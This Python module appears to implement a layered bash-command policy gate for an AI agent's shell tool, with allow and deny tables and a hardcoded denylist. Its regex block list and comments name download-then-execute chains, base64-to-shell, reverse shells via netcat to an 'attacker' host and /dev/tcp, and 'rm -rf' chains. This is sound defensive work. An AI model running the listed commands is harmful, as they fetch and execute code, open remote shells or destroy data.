"""Declarative bash policy evaluator.

Single pure function that takes a command string + a policy dict and
returns an allow/block decision with the matched rule name. No I/O,
no project_root, no sqlite — composability matters because the same
evaluator is invoked from the runtime gate AND from a future dashboard
preview surface ("show me what this rule change would block").

Policy shape:
    {
        "default": "block" | "allow",
        "allow": { "<base_cmd>": ["<pattern>", ...] },
        "deny":  { "<base_cmd>": ["<pattern>", ...] },
    }

Patterns are fnmatch-style. "*" matches all subcommand text. "status"
matches exactly "status" (no args). "push --force*" matches anything
starting with "push --force".

═══════════════════════════════════════════════════════════════════════
 SECURITY PRECEDENCE LADDER — read this before editing the evaluator
═══════════════════════════════════════════════════════════════════════

Layers are evaluated top-to-bottom. Each layer either BLOCKS (returns
a refusal), ALLOWS (returns success and stops), or PASSES THROUGH
(continues to the next layer). Higher = stronger — a BLOCK at a
higher layer cannot be overridden by anything below.

  Rank │ Layer                       │ Can be bypassed by
  ─────┼─────────────────────────────┼──────────────────────────────
   1   │ _JUDGE_DENYLIST filter      │ NOTHING. Hardcoded. Defense-
       │ (rm/sudo/dd/mkfs/kill/etc.) │ in-depth even if the upstream
       │                             │ grant detector misfires.
   2   │ dangerous-chain patterns    │ NOTHING. `curl … | sh` and
       │ (curl|sh, base64|sh, etc.)  │ siblings stay blocked even
       │                             │ with `allow curl` + `allow sh`.
   3   │ user-intent grant           │ _JUDGE_DENYLIST (layer 1)
       │ ("allow psql" etc.)         │ and dangerous-chain (layer 2)
       │                             │ only. Trumps layers 4 and 5.
   4   │ operator deny-table         │ user-intent grant (layer 3).
       │ (policy.deny)               │ Intent: typing "allow X" means
       │                             │ "I know X is denied, run it".
   5   │ operator allow-table        │ n/a (it only allows, can't
       │ (policy.allow)              │ block).
   6   │ default policy              │ any allow above.
       │ (policy.default=block/allow)│

The heuristic_judge runs IN ADDITION to this evaluator at the
agent_orchestrator layer. This module's job is the statically-
provable safety net; the judge is the semantic reviewer. Neither
depends on the other.

Policy shape:
    {
        "default": "block" | "allow",
        "allow": { "<base_cmd>": ["<pattern>", ...] },
        "deny":  { "<base_cmd>": ["<pattern>", ...] },
    }

Patterns are fnmatch-style. "*" matches all subcommand text. "status"
matches exactly "status" (no args). "push --force*" matches anything
starting with "push --force".

For chained / piped commands, the evaluator splits on `|`, `&&`, `||`,
`;` and requires every base command to pass. First-failing command's
reason is surfaced.
"""

from __future__ import annotations

import fnmatch
import re
from typing import Any

_CHAIN_SPLIT_RE = re.compile(r"\s*(?:\|\||&&|\||;)\s*")

# Dangerous chain patterns — match the FULL chained command, not per segment.
# Even if every segment passes per-segment deny/allow checks (e.g. `curl` and
# `sh` are both individually allowlisted), a download-then-execute chain is
# still dangerous because the composition is the supply-chain attack vector.
# Evaluated between the deny and allow passes so explicit operator denies
# still take precedence, but no allow rule can authorize one of these
# constructions.
_DANGEROUS_CHAIN_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    (
        "curl_pipe_shell",
        re.compile(
            r"\b(?:curl|wget|fetch)\b[^|]*\|\s*(?:ba|z|k|c|d)?sh\b",
            re.IGNORECASE,
        ),
    ),
    (
        "curl_pipe_python",
        re.compile(
            r"\b(?:curl|wget|fetch)\b[^|]*\|\s*python[23]?\b",
            re.IGNORECASE,
        ),
    ),
    (
        "curl_subshell_exec",
        re.compile(
            r"(?:^|[\s;&|])(?:ba|z|k|c)?sh\s+-c\s+['\"]?\$\(\s*(?:curl|wget|fetch)\b",
            re.IGNORECASE,
        ),
    ),
    (
        "curl_eval",
        re.compile(
            r"\beval\s+['\"]?\$\(\s*(?:curl|wget|fetch)\b",
            re.IGNORECASE,
        ),
    ),
    (
        "iwr_iex",
        re.compile(
            r"(?:invoke-webrequest|\biwr\b)[^|]*\|\s*(?:invoke-expression|\biex\b)",
            re.IGNORECASE,
        ),
    ),
    # Command substitution hides execution that PER-SEGMENT analysis cannot
    # see: `cat $(rm victim)` runs rm; an `echo` with backticks runs the
    # backticked command. The base command (cat/echo) is allowlisted while the
    # substituted command executes UNANALYSED. Neither transport (native Bash,
    # ai_run) can safely vet inside a substitution, so this SHARED-law rule
    # hard-denies it before EITHER spawns.
    (
        "command_substitution",
        re.compile(r"\$\(|`"),
    ),
    # Process substitution: `diff <(cmd) f` / `cmd >(sink)` likewise execute an
    # embedded command the per-segment view never inspects -> hard-deny.
    (
        "process_substitution",
        re.compile(r"<\(|>\("),
    ),
    # Netcat / ncat backdoor: `nc -e /bin/sh attacker 4444` or piped variants.
    # Even with allowlisted nc, the -e/-c reverse-shell flag is the smoking
    # gun. Also matches the "nc … | sh" pipe variant for command injection.
    (
        "netcat_reverse_shell",
        re.compile(
            r"\b(?:nc|ncat|netcat)\b[^|]*(?:\s-(?:e|c)\s+\S+|\|\s*(?:ba|z|k|c|d)?sh\b)",
            re.IGNORECASE,
        ),
    ),
    # /dev/tcp bash-builtin reverse shell: `bash -i >& /dev/tcp/host/port 0>&1`
    # — no external binary so it bypasses allowlists entirely.
    (
        "bash_dev_tcp",
        re.compile(
            r"/dev/tcp/[^\s/]+/\d+",
            re.IGNORECASE,
        ),
    ),
    # base64-decoded shell exec: `echo … | base64 -d | sh` is the obfuscated
    # cousin of curl|sh. Pattern: any "| base64 -d" feeding into a shell.
    (
        "base64_pipe_shell",
        re.compile(
            r"\bbase64\s+(?:-d|--decode)\b[^|]*\|\s*(?:ba|z|k|c|d)?sh\b",
            re.IGNORECASE,
        ),
    ),
    # Wget output-document direct-to-shell: `wget -O - URL | sh` (already
    # caught by curl_pipe_shell, but the explicit `-O -` variant is worth
    # naming so the audit log carries the exact attack vector).
    (
        "wget_output_pipe_shell",
        re.compile(
            r"\bwget\b[^|]*\s-O\s+-\s+[^|]*\|\s*(?:ba|z|k|c|d)?sh\b",
            re.IGNORECASE,
        ),
    ),
    # Cross-segment destructive: `cd <dir> && rm -rf …` — the gate's
    # per-segment view sees `cd` (allowlisted) and `rm -rf` (denied) but
    # could miss the chain's intent. Pin it explicitly so a `cd` prefix
    # can never sandwich a destructive op past the audit trail.
    (
        "cd_then_rm_rf",
        re.compile(
            r"\bcd\b[^;&|]*[;&|]+\s*(?:sudo\s+)?rm\s+(?:-[rRfd]+\s+){1,3}",
            re.IGNORECASE,
        ),
    ),
    # Powershell remove-item with -recurse -force on backslash paths
    # (Windows analog of rm -rf). Already in deny tables but the chained
    # `cd … ; remove-item -r -fo` form deserves its own audit tag.
    #
    # Doctrinal note (Batch B, 2026-04-29): this PowerShell-shape
    # rule lives in bash_policy declarative tables — strictly
    # speaking it's a misplacement under the AIDOCS shell provider
    # lock (Invariant #38), since bash_policy.py is the bash dialect
    # tier and PowerShell will get its own dispatcher in Batch C.
    # KEPT here intentionally because coverage is NOT duplicate with
    # heuristic_judge.BASH_PS_REMOVE:
    #   - BASH_PS_REMOVE catches long-form `-Recurse` (with or
    #     without `-Force`) and the order `-r ... remove-item`.
    #   - powershell_remove_recurse catches short forms `-r ... -f`
    #     and the `rd` / `rmdir` aliases, AND requires both
    #     `-r` and `-f` together.
    # Removing this rule would lose the short-form / alias coverage
    # at the bash_policy gate. Migration target: Batch C will add a
    # PowerShell dispatcher and this pattern moves to the new
    # PowerShell rule table at that time. Until then, keep as-is.
    (
        "powershell_remove_recurse",
        re.compile(
            # Match `Remove-Item -Recurse -Force …` AND short forms
            # `ri -r -fo …` / `ri -recurse -force …`. PowerShell tolerates
            # any unique prefix, so `-r` and `-fo` are both `-Recurse` and
            # `-Force` shortenings. Word-boundary on the rule keyword is
            # too strict; just pin -r… and -f… as the next args after the
            # cmdlet name with at most one other token between them.
            r"\b(?:remove-item|ri|rd|rmdir)\b(?:\s+-\w+)*\s+-r\w*(?:\s+-\w+)*\s+-f\w*",
            re.IGNORECASE,
        ),
    ),
]


def _split_chained(command: str) -> list[str]:
    """Split a shell command on chain operators, respecting shell quoting
    and balanced parens/brackets.

    Chain operators: `|`, `||`, `&&`, `;`.
    Quotes: single (`'...'`) and double (`"..."`). A backslash inside
        double quotes escapes the next character (including another `"`).
        Single quotes disable all escapes (matches POSIX shell).
    Brackets: `(...)`, `[...]`, `{...}`. Must balance; nesting tracked
        with a stack. Useful so `python -c "[x for x in y]"` and
        `bash -lc '(a && b)'` don't get shredded at the `;` or `&&`
        inside them — the per-segment evaluator would reject the
        fragments as unparseable otherwise.

    This is still not a full shell parser — process substitution `<(...)`,
    here-docs, and arithmetic `$((...))` are treated as opaque balanced
    regions, which is the right default for policy evaluation (policy
    cares about base commands, not arithmetic internals).
    """
    segments: list[str] = []
    buf: list[str] = []
    i = 0
    n = len(command)
    quote: str | None = None  # active quote char, or None
    bracket_stack: list[str] = []

    def flush() -> None:
        piece = "".join(buf).strip()
        if piece:
            segments.append(piece)
        buf.clear()

    while i < n:
        c = command[i]

        # Inside a quote: consume until matching close. Double quotes
        # honor backslash escapes; single quotes don't.
        if quote is not None:
            buf.append(c)
            if quote == '"' and c == "\\" and i + 1 < n:
                buf.append(command[i + 1])
                i += 2
                continue
            if c == quote:
                quote = None
            i += 1
            continue

        # Not in a quote.
        if c in ("'", '"'):
            quote = c
            buf.append(c)
            i += 1
            continue
        if c in "([{":
            bracket_stack.append(c)
            buf.append(c)
            i += 1
            continue
        if c in ")]}":
            # Pop matching opener if present; tolerate unbalanced input.
            if bracket_stack:
                opener = bracket_stack[-1]
                if (opener, c) in (("(", ")"), ("[", "]"), ("{", "}")):
                    bracket_stack.pop()
            buf.append(c)
            i += 1
            continue

        # Outside any quote / bracket region — look for chain operators.
        if not bracket_stack:
            if c == "&" and i + 1 < n and command[i + 1] == "&":
                flush()
                i += 2
                continue
            if c == "|" and i + 1 < n and command[i + 1] == "|":
                flush()
                i += 2
                continue
            if c == "|":
                flush()
                i += 1
                continue
            if c == ";":
                flush()
                i += 1
                continue

        buf.append(c)
        i += 1

    flush()
    return segments


_ENV_PREFIX_RE = re.compile(r"^\s*([A-Z_][A-Z0-9_]*=\S*\s+)+", re.IGNORECASE)


def _normalize_basename(token: str) -> str:
    # Strip surrounding quotes, pull out the trailing path component, drop
    # a Windows .exe suffix so quoted absolute invocations
    # (`"C:/Program Files/PostgreSQL/17/bin/pg_dump.exe"`) match an allow
    # table keyed on the bare binary name (`pg_dump`). Mirrors the behavior
    # of the retired access_gate._extract_bash_commands — keeping the
    # normalization at the single-source-of-truth boundary avoids operators
    # having to encode every shell path they might be handed.
    t = token.strip()
    if (t.startswith('"') and t.endswith('"')) or (t.startswith("'") and t.endswith("'")):
        t = t[1:-1]
    # Path separator split — last component wins. Handle both unix and
    # windows separators; POSIX mingw paths like /c/Program Files work.
    t = t.replace("\\", "/")
    if "/" in t:
        t = t.rsplit("/", 1)[-1]
    if t.lower().endswith(".exe"):
        t = t[:-4]
    return t.lower()


def _base_command(segment: str) -> tuple[str, str]:
    """Return (base_command, args_text) for a single shell segment.

    `python -m pytest tests/` → ("python", "-m pytest tests/")
    `git status` → ("git", "status")
    `git` → ("git", "")
    `"C:/PG/pg_dump.exe" -h host` → ("pg_dump", "-h host")
    `PGPASSWORD=x pg_dump -v` → ("pg_dump", "-v")
    """
    stripped = segment.strip()
    # Strip leading env-var assignments (e.g. `PGPASSWORD=x CMD`).
    env_match = _ENV_PREFIX_RE.match(stripped)
    if env_match:
        stripped = stripped[env_match.end() :]
    # Honor a leading quoted path — take everything between matching quotes
    # as the command token, so `"C:/Program Files/pg_dump.exe" --help`
    # doesn't split at the interior space.
    if stripped.startswith('"'):
        close = stripped.find('"', 1)
        if close > 0:
            head = stripped[: close + 1]
            tail = stripped[close + 1 :].lstrip()
            return _normalize_basename(head), tail
    parts = stripped.split(maxsplit=1)
    if not parts:
        return "", ""
    base = _normalize_basename(parts[0])
    args = parts[1] if len(parts) > 1 else ""
    return base, args


def _pattern_matches(pattern: str, args: str) -> bool:
    """Match a policy pattern against a command's args text.

    "" pattern → only matches when args is empty (operator authorized
        the bare command, no args)
    "*" → matches anything (empty args included)
    "status" → exact match (no args)
    "status *" → status with any args
    "push --force*" → starts with "push --force"
    """
    pattern_clean = pattern.strip()
    if not pattern_clean:
        return not args
    if pattern_clean == "*":
        return True
    return fnmatch.fnmatchcase(args, pattern_clean)


def _evaluate_segment_deny(segment: str, policy: dict[str, Any]) -> dict[str, Any] | None:
    """Deny-table check for one un-chained segment.

    Returns a block decision when a deny rule fires, or None when the
    segment passes the deny pass. An empty/unparseable segment is itself
    a block decision (we never silently allow something we couldn't
    tokenize).
    """
    base, args = _base_command(segment)
    if not base:
        return {
            "allowed": False,
            "reason": "Empty bash command segment.",
            "matched_rule": None,
        }

    deny_table = policy.get("deny") or {}
    for pattern in deny_table.get(base, []) or []:
        if _pattern_matches(pattern, args):
            return {
                "allowed": False,
                "reason": (f"Command `{base} {args}` blocked by deny rule `{base}[{pattern}]`."),
                "matched_rule": f"deny.{base}[{pattern}]",
            }
    return None


def _evaluate_segment_allow(segment: str, policy: dict[str, Any]) -> dict[str, Any]:
    """Allow-table + default check for one un-chained segment.

    Caller must have already passed the segment through the deny pass
    and the dangerous-chain pass.
    """
    base, args = _base_command(segment)
    if not base:
        return {
            "allowed": False,
            "reason": "Empty bash command segment.",
            "matched_rule": None,
        }

    allow_table = policy.get("allow") or {}
    default = str(policy.get("default") or "block").lower()

    for pattern in allow_table.get(base, []) or []:
        if _pattern_matches(pattern, args):
            return {
                "allowed": True,
                "reason": f"Allowed by allow.{base}[{pattern}].",
                "matched_rule": f"allow.{base}[{pattern}]",
            }

    if default == "allow":
        return {
            "allowed": True,
            "reason": "Allowed by default policy (default=allow).",
            "matched_rule": "default.allow",
        }

    return {
        "allowed": False,
        "reason": (
            f"Command `{base}` blocked by default policy (default=block, no allow rule matched)."
        ),
        "matched_rule": "default.block",
    }


def _evaluate_dangerous_chain(command: str) -> dict[str, Any] | None:
    """Detect download-then-execute chains in the FULL command.

    Per-segment evaluation can't see chain semantics: each side of a
    `curl … | sh` pipe may be individually allowlisted, but the
    composition is the supply-chain attack vector. Returns a block
    decision when a dangerous pattern matches, None when the command
    is clean.

    Matches against the EXECUTABLE SURFACE — data-only windows (git -m/-F
    message payloads, heredoc bodies) are masked first — so a commit message
    that merely QUOTES `curl|sh` / `$(rm x)` / `rm -rf /` is not mistaken for
    executing it. Real execution outside the data window (a trailing
    `&& rm -rf /`, or a separate `| sh` segment) stays visible and matches.
    """
    from .shell_data_windows import mask_data_windows

    surface = mask_data_windows(command)
    for name, pattern in _DANGEROUS_CHAIN_PATTERNS:
        if pattern.search(surface):
            return {
                "allowed": False,
                "reason": (
                    f"Command blocked by dangerous-chain rule `{name}` "
                    "— download-then-execute pattern."
                ),
                "matched_rule": f"dangerous_chain.{name}",
            }
    return None


#  Hardcoded tokens that NEVER receive user-intent grants at this layer,
#  no matter what the upstream detector claims. The judge-equivalent
#  denylist: destructive primitives that must fail closed even if a
#  grant somehow reached us. Mirrors canonical_intent_registry.BASH_SUBCMD_GRANT_DENYLIST
#  so there's no single point of bypass.
_JUDGE_DENYLIST: frozenset[str] = frozenset(
    {
        "rm",
        "sudo",
        "doas",
        "runas",
        "dd",
        "mkfs",
        "format",
        "kill",
        "killall",
        "pkill",
        "chmod",
        "chown",
        "shutdown",
        "reboot",
        "halt",
        "poweroff",
    },
)


def _normalize_grants(
    user_intent_subcommands: list[str] | None,
) -> frozenset[str]:
    """Defensive normalization: lowercased, stripped, judge-denylist
    removed. Returns frozenset for O(1) membership checks in hot path.
    """
    if not user_intent_subcommands:
        return frozenset()
    out: set[str] = set()
    for token in user_intent_subcommands:
        if not token:
            continue
        t = str(token).strip().lower()
        if not t or t in _JUDGE_DENYLIST:
            continue
        out.add(t)
    return frozenset(out)


# OS-mismatch table. Maps base command → suggested replacement on
# the current platform. Conservative: only commands that are GENUINELY
# unavailable on the wrong OS are listed. Tools commonly bundled with
# Git Bash / WSL / Cygwin (`grep`, `tail`, `head`, `sort`, `wc`,
# `cut`, `uniq`, `sed`, `awk`, `diff`, `which`) are NOT gated — most
# Windows dev machines have them via Git for Windows. Listing them
# here false-refuses real-world commands.
# Truly POSIX-only kept here:
_LINUX_ONLY_COMMANDS: dict[str, str] = {
    "chmod": "File permissions are POSIX-only; no Windows equivalent needed.",
    "chown": "File ownership semantics differ on Windows; use `icacls` if needed.",
    "ln": "Use PowerShell `New-Item -ItemType SymbolicLink`.",
    "ps": "Use PowerShell `Get-Process` or Windows `tasklist`.",
    "kill": "Use PowerShell `Stop-Process` or Windows `taskkill /PID N /F`.",
}
_WINDOWS_ONLY_COMMANDS: dict[str, str] = {
    "where": "Use POSIX `which` or `command -v`.",
    "type": "Use POSIX `cat` (note: bash `type` exists but is the "
    "command-introspection builtin, not file print).",
    "tasklist": "Use POSIX `ps aux` or `pgrep`.",
    "taskkill": "Use POSIX `kill -9 PID` or `pkill name`.",
    "dir": "Use POSIX `ls`.",
    "icacls": "POSIX file permissions use `chmod` / `chown`.",
    "cls": "Use POSIX `clear`.",
    "powershell": "PowerShell is rarely installed on POSIX hosts.",
    "pwsh": "PowerShell Core requires explicit install on POSIX.",
    "cmd": "POSIX uses `sh` / `bash`.",
    "robocopy": "Use POSIX `rsync` or `cp -r`.",
    "xcopy": "Use POSIX `cp -r`.",
}


def _current_os_kind() -> str:
    """Return 'windows', 'linux', 'mac', or 'other'."""
    import sys as _sys

    plat = _sys.platform
    if plat.startswith("win"):
        return "windows"
    if plat.startswith("linux"):
        return "linux"
    if plat == "darwin":
        return "mac"
    return "other"


def _evaluate_os_mismatch(segments: list[str]) -> dict[str, Any] | None:
    """Refuse if any segment uses a command native to the OTHER OS.

    Returns a structured refusal with an actionable suggestion when
    the agent's command can't possibly work on the current platform,
    so the agent doesn't burn a turn on a confusing exit-255 stderr.
    Returns None when the OS is unknown (silent pass — fall through
    to normal policy) or when the command is portable.
    """
    os_kind = _current_os_kind()
    if os_kind == "other":
        return None
    if os_kind == "windows":
        blocklist = _LINUX_ONLY_COMMANDS
        wrong_os = "Linux/Mac"
    else:
        blocklist = _WINDOWS_ONLY_COMMANDS
        wrong_os = "Windows"
    for seg in segments:
        base, _args = _base_command(seg)
        if base in blocklist:
            suggestion = blocklist[base]
            return {
                "allowed": False,
                "reason": (
                    f"`{base}` is a {wrong_os} command and is not "
                    f"available on {os_kind}. {suggestion}"
                ),
                "matched_rule": f"os_mismatch.{os_kind}.{base}",
            }
    return None


def evaluate_destructive_floor(command: str) -> dict[str, Any]:
    """Hardcoded, un-overridable destructive-primitive floor for shell egress
    that does NOT pass through the full operator policy — the internal/sync
    ``code_runner._run_process`` chokepoint. Its live caller is
    ``code_runner.ai_run`` behind the ``git_ops`` MCP tool; the
    ``code_build``/``code_test`` functions also route through it but are legacy
    (no live callers since the sync MCP wrappers were deleted 2026-04-20). The
    MCP ``ai_run`` tool already enforces the whole cascade; this guarantees that
    EVERY shell egress, including the internal one, still fails closed on the
    universal danger primitives.

    Applies ONLY the two layers that are safety, not preference:
      * the judge denylist (rm/sudo/doas/dd/mkfs/kill/chmod/chown/shutdown/…)
        on each chained segment's base command, and
      * the dangerous-chain detector (``curl … | sh`` download-then-execute,
        reverse shells, inline-code bypasses).

    It deliberately does NOT impose the operator allow/deny tables or the
    default-block policy, so legitimately constructed internal commands
    (``git diff``, ``npm test``) still run — but an injected ``; rm -rf ~`` or
    ``curl x | sh`` is refused regardless of caller. Returns
    {allowed, reason, matched_rule}.
    """
    if not command or not command.strip():
        return {"allowed": False, "reason": "Empty command.", "matched_rule": None}
    segments = _split_chained(command)
    if not segments:
        return {
            "allowed": False,
            "reason": "Command parsed to zero segments.",
            "matched_rule": None,
        }
    for seg in segments:
        base, _args = _base_command(seg)
        # Catch dotted families too (mkfs.ext4 / mkfs.xfs map to mkfs) so a
        # variant can't slip past an exact-match denylist.
        if base in _JUDGE_DENYLIST or base.split(".", 1)[0] in _JUDGE_DENYLIST:
            return {
                "allowed": False,
                "reason": (
                    f"Command blocked by destructive-primitive floor "
                    f"`{base}` — unbypassable on the internal shell "
                    f"egress path."
                ),
                "matched_rule": f"destructive_floor.{base}",
            }
    chain = _evaluate_dangerous_chain(command)
    if chain is not None:
        return chain
    # Catastrophic SHAPES that carry no denylisted base command — a fork bomb
    # (base `:`), a raw `> /dev/sda` redirect (no base command), `chroot /` /
    # `mount /dev/…` host-escape. The token loop above cannot see these. One
    # shared taxonomy with the judge; masked surface so a quoted commit
    # message cannot trip it.
    try:
        from .destructive_taxonomy import hard_deny_verdict
        from .shell_data_windows import mask_data_windows

        _shape = hard_deny_verdict(mask_data_windows(command))
    except Exception:
        _shape = None
    if _shape is not None:
        return {
            "allowed": False,
            "reason": (
                f"Command blocked by destructive-shape floor `{_shape.rule_id}` "
                f"— {_shape.reason}"
            ),
            "matched_rule": f"destructive_floor.{_shape.family}",
        }
    return {
        "allowed": True,
        "reason": "No destructive primitive matched.",
        "matched_rule": "destructive_floor.clean",
    }


def evaluate_bash_policy(
    command: str,
    policy: dict[str, Any],
    user_intent_subcommands: list[str] | None = None,
    *,
    workspace_root: str | None = None,
) -> dict[str, Any]:
    """Evaluate a (possibly chained) bash command against a policy dict.

    Returns dict with keys:
        allowed: bool
        reason: str (human-readable, suitable for tool-decision messages)
        matched_rule: str | None (for audit trail)

    Every segment of a chained command must pass; first-failing segment's
    decision is returned.

    user_intent_subcommands: per-session user-granted base commands (from
    the "psql allowed" / "allow docker" grant-phrase detector in
    claude_hook). Semantics:

    - Trumps the deny-table: an operator who typed "allow psql" overrides
      any accidental `deny.psql[*]` rule. This is the whole point of
      user-intent gates — the user is explicitly authorizing the risk.
    - Trumps default-block: a session grant is equivalent to a transient
      allow-table entry for the turn.
    - NEVER bypasses the dangerous-chain check (Phase 2 below). `curl | sh`
      remains judge-blocked regardless of what the user typed.
    - NEVER bypasses _JUDGE_DENYLIST. Hardcoded destructive primitives
      fail closed at this layer as defense-in-depth; even if the grant
      detector misfires and hands us `rm`, we refuse.
    """
    if not command or not command.strip():
        return {
            "allowed": False,
            "reason": "Empty bash command.",
            "matched_rule": None,
        }

    from .shell_data_windows import mask_data_windows as _mask_surface

    # Split the data-masked surface so an inert-reader heredoc body is
    # blanked and its operators do not shred the command into spurious
    # segments and wrongly deny it. Interpreter heredocs are not masked but
    # Phase 2b refuses them; base commands outside masked windows are intact.
    segments = _split_chained(_mask_surface(command))
    if not segments:
        return {
            "allowed": False,
            "reason": "Bash command parsed to zero segments.",
            "matched_rule": None,
        }

    # Filter user-intent grants through the judge denylist here too, so a
    # compromised upstream detector can't hand us `rm`. Defense in depth.
    grants = _normalize_grants(user_intent_subcommands)

    # Phase 0 — OS mismatch check. Refuse Linux-only commands on Windows
    # and Windows-only commands on Linux/Mac BEFORE spawning a subprocess
    # that will exit 255 with a confusing "not recognized" error. The
    # refusal carries an actionable suggestion (the cross-platform or
    # native-OS equivalent) so the agent doesn't waste a turn discovering
    # the error from stdout. (Diagnosed 2026-04-20: agent ran `tail -50`
    # on Windows, got exit 255, didn't realize tail isn't installed.)
    os_check = _evaluate_os_mismatch(segments)
    if os_check is not None:
        return os_check

    # Phase 1 — deny-table per segment. Operator-explicit denies normally
    # win, BUT a user-intent grant for the same base command overrides:
    # typing "allow psql" means "I know psql is denied by default, run it
    # anyway." The judge denylist below keeps the truly dangerous ones
    # locked regardless.
    for seg in segments:
        base, _args = _base_command(seg)
        if base in grants and base not in _JUDGE_DENYLIST:
            # Grant trumps deny-table for this base command.
            continue
        deny_result = _evaluate_segment_deny(seg, policy)
        if deny_result is not None:
            return deny_result

    # Phase 2 — dangerous-chain check on the FULL command. UNBYPASSABLE.
    # Grants and operator config cannot authorize `curl … | sh`. This is
    # the judge layer at the bash policy tier; the heuristic_judge runs
    # in addition, but this check is the statically-provable safety net.
    chain_result = _evaluate_dangerous_chain(command)
    if chain_result is not None:
        return chain_result

    # Phase 2b — heredoc consumer law. UNBYPASSABLE. A heredoc fed to an
    # interpreter / shell / eval / source / awk / writer / undecidable
    # consumer is execution-bearing stdin that cannot be proven inert —
    # refuse it BEFORE spawn. Inert-data heredocs (cat/grep/head/… <<EOF)
    # pass; their body is masked for the matchers. Closes the prior
    # universal-heredoc-masking bypass (an interpreter heredoc body used to
    # be blanked, hiding `rm -rf /` / subprocess / exfil from every matcher).
    from .shell_data_windows import heredoc_fail_closed

    _risky_heredocs = heredoc_fail_closed(command)
    if _risky_heredocs:
        return {
            "allowed": False,
            "reason": (
                "Command blocked by heredoc consumer law — a heredoc feeds "
                f"execution-bearing stdin to `{_risky_heredocs[0]}`. Only "
                "proven inert-data readers (cat/grep/head/…) may take a "
                "heredoc; use a script file or an inspected `-c` form for "
                "interpreter input."
            ),
            "matched_rule": f"heredoc_exec.{_risky_heredocs[0]}",
        }

        # Phase 3 — allow-table per segment + default fallthrough. User-intent
    # grants count as a per-turn allow entry.
    last_allow: dict[str, Any] | None = None
    for seg in segments:
        base, _args = _base_command(seg)
        if base in grants and base not in _JUDGE_DENYLIST:
            last_allow = {
                "allowed": True,
                "reason": f"Allowed by user-intent grant for `{base}`.",
                "matched_rule": f"user_intent.{base}",
            }
            continue
        # Governed read-only family — a curated, workspace-bounded class
        # (grep/rg/find/cat/head/tail/git-status-style) is allowed through
        # the governed shell even without an explicit allow rule. Runs
        # AFTER the unbypassable deny-table + dangerous-chain phases, and
        # is_governed_readonly itself refuses writes, network binaries
        # (curl/wget/ssh hard-deny), metacharacters, and out-of-workspace
        # paths — so this never opens egress or a write.
        if workspace_root is not None:
            try:
                from .shell_readonly import is_governed_readonly

                gr_ok, _gr_reason = is_governed_readonly(seg, workspace_root)
            except Exception:
                gr_ok = False
            if gr_ok:
                last_allow = {
                    "allowed": True,
                    "reason": (
                        f"Allowed by governed read-only family (workspace-bounded): `{base}`."
                    ),
                    "matched_rule": f"governed_readonly.{base}",
                }
                continue
            # Governed project-local SCRIPT-FILE execution. `bash ./x.sh` is
            # the same threat class as the already-permitted `python x.py`
            # (repo-owned code, contents uninspected). Runs AFTER the
            # unbypassable deny-table + dangerous-chain phases, so an inline
            # `bash -c '…'`, a trailing `&& rm -rf /`, or a `| sh` segment all
            # stay denied. See shell_local_script for the full refused set.
            try:
                from .shell_local_script import is_governed_local_script

                ls_ok, _ls_reason = is_governed_local_script(seg, workspace_root)
            except Exception:
                ls_ok = False
            if ls_ok:
                last_allow = {
                    "allowed": True,
                    "reason": (
                        f"Allowed by governed project-local script execution: `{base}`."
                    ),
                    "matched_rule": f"local_script.{base}",
                }
                continue
        result = _evaluate_segment_allow(seg, policy)
        if not result["allowed"]:
            return result
        last_allow = result

    return last_allow or {
        "allowed": False,
        "reason": "No segments evaluated.",
        "matched_rule": None,
    }
